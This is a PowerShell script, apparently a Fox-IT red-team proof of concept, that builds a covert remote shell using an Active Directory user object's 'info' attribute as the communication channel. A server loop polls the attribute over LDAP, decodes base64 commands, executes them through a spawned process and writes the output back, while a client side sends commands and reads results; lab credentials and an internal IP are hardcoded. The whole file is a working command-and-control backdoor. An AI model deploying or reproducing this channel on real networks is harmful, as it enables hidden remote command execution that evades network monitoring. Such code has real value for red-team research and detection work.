<#

MIT License

Copyright (c) 2020 Fox-IT

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

#>

function Get-ADCommand {
    

    try {
        #$userDN = & whoami /fqdn
        $userDN = 'CN=Regular,OU=Regular,OU=Corp,DC=chipmunk,DC=local'
    
        $dirEntry = new-object System.DirectoryServices.DirectoryEntry "LDAP://192.168.32.129/$userDN", 'Regular', 'Password123#'

        $dirSearcher = new-object System.DirectoryServices.DirectorySearcher $dirEntry
        [void]$dirSearcher.PropertiesToLoad.Add('info')
        $res = $dirSearcher.findOne()
        $inputString = $res.Properties['info']

        $dirEntry.Dispose()
        $dirSearcher.Dispose()

        return $inputString

    }
    catch {}


}

function Set-ADCommandResult ($cmdOutput){

    #$userDN = & whoami /fqdn
    $userDN = 'CN=Regular,OU=Regular,OU=Corp,DC=chipmunk,DC=local'
    
    $dirEntry = new-object System.DirectoryServices.DirectoryEntry "LDAP://192.168.32.129/$userDN", 'Regular', 'Password123#'
    $dirEntry.put("info",$cmdOutput)
    $dirEntry.Setinfo()
    $dirEntry.Dispose()

    #$dirSearcher = new-object System.DirectoryServices.DirectorySearcher $dirEntry
    #$dirSearcher.PropertiesToLoad.Add('info')
    #$res = $dirSearcher.findOne()


}

function Convert-FromB64([string]$inp) {
    return [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($inp))
}

function Convert-ToB64([string]$inp) {
    
    return [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($inp))   
}

function Run-Cmd ([string]$inp){
    
    $fname = ""
    $argv  = ""
    $output = ""

    if ($inp.Contains(' ')) {
        $fname = $inp.Split(' ')[0]
        $argv  = [string]::Join(' ',$inp.Split(' ')[1..$($inp.Split(' ').Length -1)])
    } else{
        $fname = $inp
    }
    
    try {
        $p = New-Object System.Diagnostics.Process
        $pInfo = New-Object System.Diagnostics.ProcessStartInfo
        $pInfo.Arguments = $argv
        $pInfo.FileName = $fname
        $pInfo.RedirectStandardError = $true
        $pInfo.RedirectStandardOutput = $true
        $pInfo.WorkingDirectory = 'C:\Windows\System32'
        $pInfo.UseShellExecute = $false
        $p.StartInfo = $pInfo
    
        [void]$p.Start()
        [void]$p.WaitForExit()

        $output = $p.StandardOutput.ReadToEnd()
        $output += $p.StandardError.ReadToEnd()
    } catch {}

    return $output

}

function ADShellServer {

    $stop = $false
    Write-Host '[+] Listening for commands on info attribute...'

    do {

        [string]$cmd = Get-ADCommand

        try {
            if(-not [string]::IsNullOrEmpty($cmd)){

                ##msg
                ##cmd
                ##stop
                if ($cmd.StartsWith('msg')){
                    $msg = $cmd.Split(':')[1].TrimStart(' ')
                    Write-Host "[+] Received: $(Convert-FromB64($msg))"
                    Set-ADCommandResult ' '
                } elseif($cmd.StartsWith('cmd')){
                    $cmdToRun = $cmd.split(':').TrimStart(' ')[1]
                    $decodedCommand = $(Convert-FromB64($cmdToRun))
                    Write-Host "[+]Received command: $decodedCommand"
                    $res = Run-Cmd $decodedCommand
                    Set-ADCommandResult "res: $(Convert-ToB64($res))"
                } elseif($cmd.StartsWith('stop')){
                    $stop = $true
                    return
                }
            }
        } catch {}
        

        sleep(1)

    }while(-not $stop)
}

function ADShellClient {

    
    $stop = $false


    do {

        Write-Host -NoNewline 'ADShell> '
        $inp = Read-Host

        #[string]$cmd = Get-ADCommand
        if(-not [string]::IsNullOrEmpty($inp)){

            ##msg
            ##cmd
            ##stop
    
            if($inp.StartsWith('stop')){
                $stop = $true
                return
            }

            if ($inp.StartsWith('msg:')) {
                $b64Cmd = Convert-ToB64 ($inp.split(':')[1].TrimStart(' '))
                Set-ADCommandResult "msg: $b64Cmd"
            } else {

                $b64Cmd = Convert-ToB64 $inp
                Set-ADCommandResult "cmd: $b64Cmd"

                sleep(3)

                $res = Get-ADCommand
                $res = Convert-FromB64($res.split(':')[1].TrimStart(' '))
                Write-Host $res
            }
        }

        #sleep(1)

    }while(-not $stop)

}
